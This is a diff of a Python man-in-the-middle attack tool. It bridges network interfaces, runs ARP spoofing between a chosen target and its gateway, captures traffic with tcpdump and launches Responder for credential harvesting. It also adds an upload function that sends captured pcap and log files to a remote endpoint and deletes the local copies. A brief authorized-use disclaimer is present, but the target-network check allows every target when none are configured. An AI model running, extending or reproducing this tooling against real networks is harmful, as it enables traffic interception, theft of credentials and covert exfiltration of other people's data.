@@ -14,9 +14,6 @@ import urllib.request
 import shutil
 import socket
 from concurrent.futures import ThreadPoolExecutor
-import curses
-import threading
-import queue
 
 # ASCII Art
 ASCII_ART = r"""
@@ -59,24 +56,7 @@ class MITMTool:
         self.capture_processes = {}
         self.mac_vendors = {}
         self.load_mac_vendors()
-        self.packet_count = 0
-        self.active_attacks = set()
-        self.status_queue = queue.Queue()
-        self.status_thread = threading.Thread(target=self.status_updater, daemon=True)
-        self.status_thread.start()
-
-    def status_updater(self):
-        """Background thread to update packet count and active attacks"""
-        while True:
-            try:
-                if 'tcpdump' in self.capture_processes:
-                    self.packet_count += 10  # Dummy increment
-                else:
-                    self.packet_count = 0
-                time.sleep(5)
-            except Exception:
-                time.sleep(5)
-
+        
     def load_mac_vendors(self):
         """Load MAC vendor database for device identification"""
         try:
@@ -89,7 +69,7 @@ class MITMTool:
                 for line in f:
                     if "(base 16)" in line:
                         parts = line.split("(base 16)")
-                        mac_prefix = parts[0].strip().replace('-', ':').upper()
+                        mac_prefix = parts[0].strip().replace('-', ':')
                         vendor = parts[1].strip()
                         self.mac_vendors[mac_prefix] = vendor
             logger.info(f"Loaded {len(self.mac_vendors)} MAC vendors")
@@ -136,25 +116,31 @@ class MITMTool:
 
     def get_device_name(self, ip, mac):
         """Try multiple methods to get human-readable device names"""
+        # Method 1: Check DHCP hostname first
         dhcp_name = self.get_dhcp_name(mac)
         if dhcp_name and dhcp_name.lower() not in ['unknown', 'localhost', 'android']:
             return dhcp_name
             
+        # Method 2: Try NetBIOS name resolution
         netbios_name = self.get_netbios_name(ip)
         if netbios_name:
             return netbios_name
             
+        # Method 3: Try mDNS (Bonjour)
         mdns_name = self.get_mdns_name(ip)
         if mdns_name:
             return mdns_name
             
+        # Method 4: Try LLMNR
         llmnr_name = self.get_llmnr_name(ip)
         if llmnr_name:
             return llmnr_name
             
+        # Fallback to MAC vendor + IP
         return f"{self.get_device_type(mac)} Device"
 
     def get_dhcp_name(self, mac):
+        """Extract hostname from DHCP leases"""
         try:
             with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                 for line in f:
@@ -166,6 +152,7 @@ class MITMTool:
         return None
 
     def get_netbios_name(self, ip):
+        """Get NetBIOS name using nmblookup"""
         try:
             result = subprocess.run(
                 ["nmblookup", "-A", ip],
@@ -179,6 +166,7 @@ class MITMTool:
         return None
 
     def get_mdns_name(self, ip):
+        """Try to resolve mDNS (Bonjour) name"""
         try:
             result = subprocess.run(
                 ["avahi-resolve", "-a", ip],
@@ -193,32 +181,40 @@ class MITMTool:
         return None
 
     def get_llmnr_name(self, ip):
+        """Try LLMNR name resolution"""
         try:
             result = subprocess.run(
                 ["nmblookup", "-A", ip],
                 capture_output=True, text=True, timeout=2
             )
             for line in result.stdout.split('\n'):
-                if "<20>" in line:
+                if "<20>" in line:  # File Server Service
                     return line.split()[0]
         except:
             pass
         return None
 
     def enhance_device_info(self, device):
+        """Add additional identification to device info"""
         ip = device.get('ip')
         mac = device.get('mac')
         
         if not ip or not mac:
             return device
             
+        # Add device name
         device['name'] = self.get_device_name(ip, mac)
+        
+        # Add manufacturer from MAC
         device['manufacturer'] = self.get_device_type(mac)
+        
+        # Try to get operating system info
         device['os'] = self.guess_os(ip, mac)
         
         return device
 
     def guess_os(self, ip, mac):
+        """Attempt to guess operating system"""
         vendor = self.get_device_type(mac).lower()
         
         if 'apple' in vendor:
@@ -230,6 +226,7 @@ class MITMTool:
         elif 'linux' in vendor:
             return 'Linux'
             
+        # Try nmap OS detection if available
         try:
             result = subprocess.run(
                 ["nmap", "-O", "--osscan-limit", ip],
@@ -243,6 +240,7 @@ class MITMTool:
         return 'Unknown'
 
     def load_config(self):
+        """Load configuration from file"""
         try:
             with open(CONFIG_FILE) as f:
                 self.config = json.load(f)
@@ -257,6 +255,7 @@ class MITMTool:
             logger.warning("Using default configuration")
 
     def check_safety(self):
+        """Display legal disclaimers and safety checks"""
         disclaimer = """
         WARNING: This tool is for authorized security auditing and penetration testing only.
         Unauthorized use is illegal and unethical. By using this tool, you agree that:
@@ -278,18 +277,20 @@ class MITMTool:
             self.save_config()
 
     def save_config(self):
+        """Save configuration to file"""
         os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
         with open(CONFIG_FILE, 'w') as f:
             json.dump(self.config, f, indent=4)
 
     def setup_environment(self):
+        """Create necessary directories and check dependencies"""
         os.makedirs(DATA_DIR, exist_ok=True)
         
+        # Check for required tools
         required_tools = [
             'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
             'bettercap', 'responder', 'tailscale', 'iwlist',
-            'brctl', 'ifconfig', 'arp', 'nmblookup', 'avahi-resolve',
-            'dnsmasq'
+            'brctl', 'ifconfig', 'arp', 'nmblookup', 'avahi-resolve'
         ]
         
         missing_tools = []
@@ -302,6 +303,7 @@ class MITMTool:
             sys.exit(1)
 
     def check_tool_installed(self, tool):
+        """Check if a command line tool is installed"""
         try:
             subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             return True
@@ -309,6 +311,7 @@ class MITMTool:
             return False
 
     def detect_interfaces(self):
+        """Detect available network interfaces"""
         self.interfaces = {}
         try:
             interfaces = netifaces.interfaces()
@@ -333,6 +336,7 @@ class MITMTool:
             return False
 
     def setup_bridge(self):
+        """Bridge two Ethernet interfaces"""
         ethernet_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'ethernet']
         
         if len(ethernet_ifaces) < 2:
@@ -355,8 +359,8 @@ class MITMTool:
             logger.error(f"Failed to create bridge: {str(e)}")
             return False
 
-    # --- Updated network_scan with formatted ARP scan and faster Nmap ---
     def network_scan(self):
+        """Perform network scan using nmap and arp-scan"""
         if not self.interfaces:
             logger.error("No interfaces detected")
             return
@@ -369,37 +373,22 @@ class MITMTool:
                 ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                 capture_output=True, text=True
             )
-            raw_arp_output = arp_scan.stdout
+            print(arp_scan.stdout)
             
-            # Clear screen before printing
-            os.system('clear')
-            print(f"{'IP Address':<15} {'MAC Address':<18} {'Vendor'}")
-            print("-" * 50)
-            live_hosts = []
-            for line in raw_arp_output.splitlines():
-                match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s*(.*)", line, re.I)
-                if match:
-                    ip, mac, vendor = match.groups()
-                    print(f"{ip:<15} {mac:<18} {vendor}")
-                    live_hosts.append(ip)
-            
-            if not live_hosts:
-                logger.warning("No live hosts found for Nmap scan.")
-                return
-            
-            logger.info(f"Running Nmap scan on {len(live_hosts)} hosts...")
-            nmap_cmd = ["sudo", "nmap", "-T4", "-F"] + live_hosts
-            nmap_scan = subprocess.run(
-                nmap_cmd,
-                capture_output=True, text=True
-            )
-            print("\nNmap Scan Results:\n")
-            print(nmap_scan.stdout)
+            logger.info("Running Nmap scan...")
+            subnet = self.get_subnet(interface)
+            if subnet:
+                nmap_scan = subprocess.run(
+                    ["sudo", "nmap", "-sV", "-O", subnet],
+                    capture_output=True, text=True
+                )
+                print(nmap_scan.stdout)
                 
         except Exception as e:
             logger.error(f"Scanning failed: {str(e)}")
 
     def get_subnet(self, interface):
+        """Calculate subnet from interface IP and netmask"""
         if interface not in self.interfaces:
             return None
             
@@ -414,6 +403,7 @@ class MITMTool:
         return None
 
     def arp_spoof(self, target_ip, gateway_ip):
+        """Start ARP spoofing between target and gateway"""
         if not self.check_target_safety(target_ip):
             logger.error(f"Target {target_ip} is not in allowed networks")
             return
@@ -424,7 +414,6 @@ class MITMTool:
             cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
             self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
             self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
-            self.active_attacks.add('ARP Spoofing')
             logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
             return True
             
@@ -433,6 +422,7 @@ class MITMTool:
             return False
 
     def check_target_safety(self, target_ip):
+        """Check if target is in allowed networks"""
         if not self.config.get("allowed_networks"):
             return True
             
@@ -442,6 +432,7 @@ class MITMTool:
         return False
 
     def start_packet_capture(self, interface="mitm-bridge", filename=None):
+        """Start packet capture with tcpdump"""
         if not filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
@@ -453,7 +444,6 @@ class MITMTool:
                 "not port 22"
             ]
             self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
-            self.active_attacks.add('Packet Capture')
             logger.info(f"Packet capture started on {interface}, saving to {filename}")
             return True
             
@@ -462,13 +452,13 @@ class MITMTool:
             return False
 
     def start_responder(self, interface="mitm-bridge"):
+        """Start Responder for credential harvesting"""
         try:
             cmd = [
                 "sudo", "responder", "-I", interface,
                 "-w", "-d", "--lm"
             ]
             self.capture_processes['responder'] = subprocess.Popen(cmd)
-            self.active_attacks.add('Responder')
             logger.info(f"Responder started on {interface}")
             return True
             
@@ -476,74 +466,376 @@ class MITMTool:
             logger.error(f"Failed to start Responder: {str(e)}")
             return False
 
-    # --- Fixed start_bettercap to accept interface and optional script_path ---
-    def start_bettercap(self, interface="mitm-bridge", script_path=None):
+    def start_bettercap(self, script_path=None):
+        """Start bettercap with optional script"""
         try:
-            cmd = ["sudo", "bettercap", "-iface", interface]
-            if script_path:
-                cmd.extend(["-caplet", script_path])
+            cmd = ["sudo", "bettercap", "-iface", "mitm-bridge"]
+            if script_path and os.path.exists(script_path):
+                cmd.extend(["-eval", f"load {script_path}"])
             self.capture_processes['bettercap'] = subprocess.Popen(cmd)
-            self.active_attacks.add('Bettercap')
-            logger.info(f"Bettercap started on {interface} with script {script_path}")
+            logger.info("Bettercap started")
             return True
+            
         except Exception as e:
-            logger.error(f"Failed to start Bettercap: {str(e)}")
-            return False
-
-    # --- Corrected start_dns_spoof function ---
-    def start_dns_spoof(self, interface="mitm-bridge", hosts_file=None):
-        try:
-            cmd = ["sudo", "dnsspoof", "-i", interface]
-            if hosts_file:
-                cmd.extend(["-f", hosts_file])
-            self.capture_processes['dnsspoof'] = subprocess.Popen(cmd)
-            self.active_attacks.add('DNS Spoofing')
-            logger.info(f"DNS spoofing started on {interface} with hosts file {hosts_file}")
-            return True
-        except Exception as e:
-            logger.error(f"Failed to start DNS spoofing: {str(e)}")
+            logger.error(f"Failed to start bettercap: {str(e)}")
             return False
 
     def stop_all_attacks(self):
-        for name, proc in self.capture_processes.items():
+        """Stop all running attack processes"""
+        for name, process in self.capture_processes.items():
             try:
-                proc.terminate()
-                proc.wait(timeout=5)
-                logger.info(f"Stopped {name} process")
-            except Exception as e:
-                logger.error(f"Failed to stop {name}: {str(e)}")
-        self.capture_processes.clear()
-        self.active_attacks.clear()
+                process.terminate()
+                process.wait(timeout=5)
+                logger.info(f"Stopped {name}")
+            except:
+                try:
+                    process.kill()
+                    logger.warning(f"Force stopped {name}")
+                except:
+                    logger.error(f"Failed to stop {name}")
+                    
+        self.capture_processes = {}
+        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
+        logger.info("All attacks stopped")
 
-    def upload_capture(self, filepath):
+    def upload_data(self):
+        """Upload captured data to remote endpoint"""
         if not self.config.get("remote_upload", False):
             logger.info("Remote upload disabled in config")
             return False
+            
         try:
-            with open(filepath, 'rb') as f:
-                files = {'file': (os.path.basename(filepath), f)}
-                response = requests.post(REMOTE_UPLOAD_URL, files=files)
-                if response.status_code == 200:
-                    logger.info(f"Successfully uploaded {filepath}")
-                    return True
-                else:
-                    logger.error(f"Upload failed with status {response.status_code}")
-                    return False
+            files = []
+            for f in os.listdir(DATA_DIR):
+                if f.endswith(".pcap") or f.endswith(".log"):
+                    files.append(os.path.join(DATA_DIR, f))
+                    
+            if not files:
+                logger.info("No capture files to upload")
+                return False
+                
+            for file_path in files:
+                with open(file_path, 'rb') as f:
+                    files = {'file': (os.path.basename(file_path), f)}
+                    response = requests.post(
+                        REMOTE_UPLOAD_URL,
+                        files=files,
+                        headers={'Authorization': f'Bearer {self.config.get("api_key", "")}'}
+                    )
+                    
+                    if response.status_code == 200:
+                        logger.info(f"Successfully uploaded {file_path}")
+                        os.remove(file_path)
+                    else:
+                        logger.error(f"Upload failed for {file_path}: {response.text}")
+                        
+            return True
+            
         except Exception as e:
             logger.error(f"Upload failed: {str(e)}")
             return False
 
-    def run(self):
+    def get_connected_wifi_devices(self, interface):
+        """Get devices connected to WiFi network using multiple methods"""
+        try:
+            logger.info(f"Checking connected devices on {interface}...")
+            devices = []
+            
+            # Method 1: ARP table
+            try:
+                arp_result = subprocess.run(
+                    ["arp", "-a", "-i", interface],
+                    capture_output=True, text=True
+                )
+                devices.extend(self.parse_arp_output(arp_result.stdout))
+            except Exception as e:
+                logger.warning(f"ARP scan failed: {str(e)}")
+
+            # Method 2: DHCP leases
+            try:
+                with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
+                    dhcp_leases = f.readlines()
+                devices.extend(self.parse_dhcp_leases(dhcp_leases))
+            except Exception as e:
+                logger.warning(f"DHCP leases read failed: {str(e)}")
+
+            # Method 3: nmap scan (active)
+            try:
+                subnet = self.get_subnet(interface)
+                if subnet:
+                    nmap_result = subprocess.run(
+                        ["sudo", "nmap", "-sn", subnet],
+                        capture_output=True, text=True
+                    )
+                    devices.extend(self.parse_nmap_scan(nmap_result.stdout))
+            except Exception as e:
+                logger.warning(f"Nmap scan failed: {str(e)}")
+
+            # Method 4: ping sweep (fallback)
+            try:
+                if not devices and subnet:
+                    ping_result = subprocess.run(
+                        ["sudo", "nmap", "-sn", "-PE", subnet],
+                        capture_output=True, text=True
+                    )
+                    devices.extend(self.parse_nmap_scan(ping_result.stdout))
+            except Exception as e:
+                logger.warning(f"Ping sweep failed: {str(e)}")
+
+            # Deduplicate devices by MAC address
+            unique_devices = {}
+            for device in devices:
+                if 'mac' in device and device['mac']:
+                    unique_devices[device['mac']] = device
+                elif 'ip' in device and device['ip']:
+                    unique_devices[device['ip']] = device
+
+            # Enhance device information
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                enhanced_devices = list(executor.map(self.enhance_device_info, unique_devices.values()))
+                
+            return enhanced_devices
+            
+        except Exception as e:
+            logger.error(f"Failed to get connected devices: {str(e)}")
+            return []
+
+    def parse_arp_output(self, arp_output):
+        """Parse ARP table output with device identification"""
+        devices = []
+        for line in arp_output.split('\n'):
+            if "ether" in line:
+                parts = line.split()
+                mac = parts[3].lower()
+                devices.append({
+                    'ip': parts[1].strip('()'),
+                    'mac': mac,
+                    'interface': parts[5],
+                    'method': 'arp'
+                })
+        return devices
+
+    def parse_dhcp_leases(self, dhcp_leases):
+        """Parse DHCP leases file with device identification"""
+        devices = []
+        for lease in dhcp_leases:
+            parts = lease.strip().split()
+            if len(parts) >= 4:
+                devices.append({
+                    'ip': parts[2],
+                    'mac': parts[1].lower(),
+                    'hostname': parts[3],
+                    'method': 'dhcp'
+                })
+        return devices
+
+    def parse_nmap_scan(self, nmap_output):
+        """Parse nmap scan output with device identification"""
+        devices = []
+        current_ip = None
+        current_mac = None
+        
+        for line in nmap_output.split('\n'):
+            if "Nmap scan report for" in line:
+                current_ip = line.split()[-1].strip('()')
+            elif "MAC Address:" in line:
+                current_mac = line.split("MAC Address: ")[1].split()[0].lower()
+                if current_ip and current_mac:
+                    devices.append({
+                        'ip': current_ip,
+                        'mac': current_mac,
+                        'method': 'nmap'
+                    })
+                    current_ip = None
+                    current_mac = None
+            elif "Host is up" in line and current_ip and not current_mac:
+                devices.append({
+                    'ip': current_ip,
+                    'method': 'ping'
+                })
+                current_ip = None
+                
+        return devices
+
+    def scan_wifi_networks(self, interface):
+        """Scan for available WiFi networks"""
+        try:
+            logger.info(f"Scanning WiFi networks on {interface}...")
+            scan_result = subprocess.run(
+                ["sudo", "iwlist", interface, "scan"],
+                capture_output=True, text=True
+            )
+            networks = []
+            current_net = {}
+            
+            for line in scan_result.stdout.split('\n'):
+                line = line.strip()
+                if "Cell" in line and "- Address:" in line:
+                    if current_net:
+                        networks.append(current_net)
+                    current_net = {'mac': line.split("Address: ")[1]}
+                elif "ESSID:" in line:
+                    current_net['ssid'] = line.split('"')[1]
+                elif "Channel:" in line:
+                    current_net['channel'] = line.split(":")[1]
+                elif "Quality=" in line:
+                    match = re.search(r'Quality=(\d+/\d+)', line)
+                    if match:
+                        current_net['quality'] = match.group(1)
+                    match = re.search(r'level=(-?\d+)', line)
+                    if match:
+                        current_net['signal'] = match.group(1)
+            
+            if current_net:
+                networks.append(current_net)
+                
+            return networks
+            
+        except Exception as e:
+            logger.error(f"WiFi scan failed: {str(e)}")
+            return []
+
+    def show_main_menu(self):
+        """Display the main menu with ASCII art"""
+        os.system('clear' if os.name == 'posix' else 'cls')
         print(ASCII_ART)
-        if not self.detect_interfaces():
-            logger.error("No suitable network interfaces found. Exiting.")
-            sys.exit(1)
-        if not self.setup_bridge():
-            logger.error("Failed to setup bridge. Exiting.")
-            sys.exit(1)
-        self.network_scan()
-        # Additional interactive or automated attack logic can be added here
+        print("\n" + "="*50)
+        print(" MAIN MENU".center(50))
+        print("="*50)
+        print("\n1. Network Scanning Tools")
+        print("2. MITM Attack Tools")
+        print("3. Packet Capture & Analysis")
+        print("4. Credential Harvesting")
+        print("5. WiFi Scanning Tools")
+        print("6. System Configuration")
+        print("7. Stop All Attacks")
+        print("8. Exit")
+
+    def show_wifi_menu(self):
+        """Display WiFi scanning menu"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+        print(ASCII_ART)
+        print("\n" + "="*50)
+        print(" WIFI SCANNING MENU".center(50))
+        print("="*50)
+        print("\n1. Scan for WiFi Networks")
+        print("2. List Connected WiFi Devices")
+        print("3. Return to Main Menu")
+
+    def handle_wifi_menu(self):
+        """Handle WiFi scanning menu with device names"""
+        wifi_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'wifi']
+        if not wifi_ifaces:
+            print("\nNo WiFi interfaces found!")
+            time.sleep(2)
+            return
+            
+        iface = wifi_ifaces[0]
+        
+        while True:
+            self.show_wifi_menu()
+            choice = input("\nSelect an option (1-3): ").strip()
+            
+            if choice == "1":
+                networks = self.scan_wifi_networks(iface)
+                print("\nAvailable WiFi Networks:")
+                for i, net in enumerate(networks, 1):
+                    print(f"{i}. {net.get('ssid', 'Hidden')} (MAC: {net.get('mac')})")
+                    print(f"   Channel: {net.get('channel')}, Signal: {net.get('signal', '?')} dBm")
+                input("\nPress Enter to continue...")
+                
+            elif choice == "2":
+                devices = self.get_connected_wifi_devices(iface)
+                print("\nConnected Devices:")
+                print("="*50)
+                for i, dev in enumerate(devices, 1):
+                    print(f"{i}. {dev.get('name', 'Unknown Device')}")
+                    print(f"   IP: {dev.get('ip')}")
+                    print(f"   MAC: {dev.get('mac')}")
+                    print(f"   Manufacturer: {dev.get('manufacturer', 'Unknown')}")
+                    print(f"   OS: {dev.get('os', 'Unknown')}")
+                    print(f"   Detected via: {dev.get('method')}")
+                    print("="*50)
+                input("\nPress Enter to continue...")
+                
+            elif choice == "3":
+                break
+            else:
+                print("Invalid choice")
+                time.sleep(1)
+
+    def interactive_menu(self):
+        """Main interactive menu"""
+        while True:
+            self.show_main_menu()
+            choice = input("\nSelect an option (1-8): ").strip()
+            
+            try:
+                if choice == "1":
+                    self.network_scan()
+                    input("\nPress Enter to continue...")
+                elif choice == "2":
+                    target = input("Enter target IP: ").strip()
+                    gateway = input("Enter gateway IP: ").strip()
+                    self.arp_spoof(target, gateway)
+                    input("\nPress Enter to continue...")
+                elif choice == "3":
+                    filename = input(f"Enter filename (default: {DATA_DIR}/capture_<timestamp>.pcap): ").strip()
+                    if not filename:
+                        filename = None
+                    self.start_packet_capture(filename=filename)
+                    input("\nPress Enter to continue...")
+                elif choice == "4":
+                    self.start_responder()
+                    input("\nPress Enter to continue...")
+                elif choice == "5":
+                    self.handle_wifi_menu()
+                elif choice == "6":
+                    print("\nConfiguration options:")
+                    print("1. Toggle remote upload (current: {})".format(
+                        "Enabled" if self.config.get("remote_upload") else "Disabled"))
+                    print("2. Add allowed network")
+                    config_choice = input("Select option: ").strip()
+                    input("\nPress Enter to continue...")
+                elif choice == "7":
+                    self.stop_all_attacks()
+                    input("\nPress Enter to continue...")
+                elif choice == "8":
+                    self.stop_all_attacks()
+                    print("\nGoodbye!")
+                    break
+                else:
+                    print("Invalid choice")
+                    time.sleep(1)
+                    
+            except KeyboardInterrupt:
+                print("\nOperation cancelled")
+                time.sleep(1)
+            except Exception as e:
+                logger.error(f"Error: {str(e)}")
+                time.sleep(2)
 
 if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print("This script must be run as root")
+        sys.exit(1)
+        
     tool = MITMTool()
-    tool.run()
+    
+    if tool.detect_interfaces():
+        ethernet_ifaces = [iface for iface in tool.interfaces if tool.interfaces[iface]['type'] == 'ethernet']
+        if len(ethernet_ifaces) >= 2:
+            if tool.setup_bridge():
+                print("\nNetwork bridge setup successfully")
+                time.sleep(2)
+            else:
+                print("\nFailed to setup bridge")
+                time.sleep(2)
+        else:
+            print("\nNot enough Ethernet interfaces for bridging")
+            time.sleep(2)
+    else:
+        print("\nNo network interfaces detected")
+        time.sleep(2)
+    
+    tool.interactive_menu()
